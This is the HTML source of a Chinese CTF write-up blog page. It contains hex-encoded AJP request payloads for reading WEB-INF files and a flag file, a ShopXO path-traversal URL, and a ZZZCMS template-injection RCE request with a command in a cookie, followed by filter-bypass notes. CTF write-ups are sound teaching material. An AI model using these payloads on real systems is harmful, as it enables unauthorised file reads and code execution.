class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000102</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>f</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0008485454502</span>f<span class="number">312e310000012</span>f<span class="number">00000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">0001610000500000000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680001532</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000102</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="keyword">c</span><span class="number">1</span> | xxd -r -p &gt; <span class="keyword">c</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>3132372e302e302e31</p>
+<p>31302e3233332e302e3131</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234017702020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">617364660000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">00093132372e302</span>e<span class="number">302e31000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">00093132372e302</span>e<span class="number">302e31000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000052</span>f<span class="number">666</span><span class="keyword">c</span><span class="number">6167000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>0x17d</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234017</span>d<span class="number">02020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">0000052</span>f<span class="number">666</span><span class="keyword">c</span><span class="number">6167000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat e1 <span class="string">| xxd -r -p &gt; e2</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/HWCTF-2022WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/09/17/HWCTF-2022WP/" class="post-title-link" itemprop="url">HWCTF-2022WP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-09-17 10:17:29" itemprop="dateCreated datePublished" datetime="2022-09-17T10:17:29+08:00">2022-09-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-18 14:21:01" itemprop="dateModified" datetime="2022-09-18T14:21:01+08:00">2022-09-18</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="shopxo"><a href="#shopxo" class="headerlink" title="shopxo"></a>shopxo</h2><p><img src="/2022/09/17/HWCTF-2022WP/image-20220917101821476.png" alt="image-20220917101821476"></p>
+<p>开搞</p>
+<p>试试能不能读他的log</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.35</span>.<span class="number">21.32</span><span class="regexp">/index.php?s=/i</span>ndex<span class="regexp">/qrcode/</span>download<span class="regexp">/url/</span>.<span class="regexp">/../</span>runtime<span class="regexp">/log/</span><span class="number">202209</span>/<span class="number">17</span>.log</span><br></pre></td></tr></table></figure>
+
+<p>按理说 从日志能读到密码。。。</p>
+<p>但好像不支持 ../ 来返回上层。。。</p>
+<p>这么才能rce 啊啊啊</p>
+<p>草草草</p>
+<p>好烦</p>
+<p>CNVD-2021-15972</p>
+<p>感觉还是打文件上传</p>
+<p>ShopXO Pa***.php文件存在任意文件删除漏洞 试试 能不能重新安装。。。</p>
+<p>先配一下debug环境。</p>
+<p>感觉应该很好配。</p>
+<p>注册一个账号 test 123456</p>
+<p>试试删文件的方法</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.35</span>.<span class="number">21.32</span><span class="regexp">/index.php?s=/i</span>ndex<span class="regexp">/FileUtil/</span>UnlinkFile/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>为什么会出现非法访问？</p>
+<p>emmm 最后一种方法</p>
+<p>该数据库 把tm admin给改回来。。。</p>
+<p>存不存在一种可能 可以爆破出flag文件的名字。。。</p>
+<p>phar 反序列化？没机会</p>
+<p>现在来理理思路</p>
+<ul>
+<li>我们不知道密码  </li>
+<li>后台可以rce</li>
+<li>找一个命令执行的点</li>
+</ul>
+<h2 id="ZZZCMS"><a href="#ZZZCMS" class="headerlink" title="ZZZCMS"></a>ZZZCMS</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.35.21.38:30080/">http://172.35.21.38:30080/</a></p>
+</blockquote>
+<p>看不到版本 头疼，，，</p>
+<img src="/2022/09/17/HWCTF-2022WP/image-20220917184847063.png" alt="image-20220917184847063" style="zoom: 50%;">
+
+<p>ok 就拿最新版搞了 搞搞搞。。。</p>
+<p>首先 前台rce  这个方向要找准。。。</p>
+<p>这个代码量很小 来 肝！</p>
+<p>感觉这个inc很可疑o.o</p>
+<p>随便找一个payload不知道能不能用</p>
+<p>[Vuls/zzzphp V2.1.0 RCE.md at main · metaStor/Vuls (github.com)](<a target="_blank" rel="noopener" href="https://github.com/metaStor/Vuls/blob/main/zzzcms/zzzphp">https://github.com/metaStor/Vuls/blob/main/zzzcms/zzzphp</a> V2.1.0 RCE/zzzphp V2.1.0 RCE.md)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /zzzcms/?location=search HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; WOW64; rv:<span class="number">52</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,en-US;q=<span class="number">0</span>.<span class="number">5</span>,en;q=<span class="number">0</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Cookies</span>: keys=&#123;if:=`calc`&#125;&#123;end if&#125;</span><br><span class="line"><span class="attribute">DNT</span>: <span class="number">1</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>全局搜索下 <code>eval</code></p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917192732058.png" alt="image-20220917192732058"></p>
+<img src="/2022/09/17/HWCTF-2022WP/image-20220917193016776.png" alt="image-20220917193016776" style="zoom: 67%;">
+
+<p>where <code>$zcontent</code> is a global variable:</p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917193355332.png" alt="image-20220917193355332"></p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917193451729.png" alt="image-20220917193451729"></p>
+<p>没过滤</p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917193549898.png" alt="image-20220917193549898"></p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917193822535.png" alt="image-20220917193822535"></p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917194030532.png" alt="image-20220917194030532"></p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917194213962.png" alt="image-20220917194213962"></p>
+<p>多了一个过滤 还能绕过吗</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安全过滤字符串，仅仅保留 [汉字、数字、字母及=&lt;&gt;,_/]，最长255字符</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_key</span>(<span class="params"> <span class="variable">$s</span> , <span class="variable">$len</span>=<span class="number">255</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$s</span>) ? @<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$s</span>) : <span class="variable">$s</span>);      </span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[\x&#123;4e00&#125;-\x&#123;9fa5&#125;a-zA-Z0-9&lt;&gt;,.:=@?_\-\/\s]/u&#x27;</span>,<span class="variable">$s</span>,<span class="variable">$result</span>);</span><br><span class="line">    <span class="variable">$temp</span> =<span class="title function_ invoke__">join</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$result</span>[<span class="number">0</span>]);     </span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>( <span class="variable">$temp</span>, <span class="number">0</span>, <span class="variable">$len</span> );</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看来是没啥戏了</p>
+<p>既然这个被ban了 那我就换一个、、</p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220917205059267.png" alt="image-20220917205059267"></p>
+<p>多试试</p>
+<p>emmm 现在的两种思路 </p>
+<ul>
+<li>继续绕他的过滤函数</li>
+<li>再找一个rce  找到另一个可以写入zcontent 的地方</li>
+</ul>
+<p>主要是 <code>&#123;&#125;</code> 这玩意没了 匹配不了，，，</p>
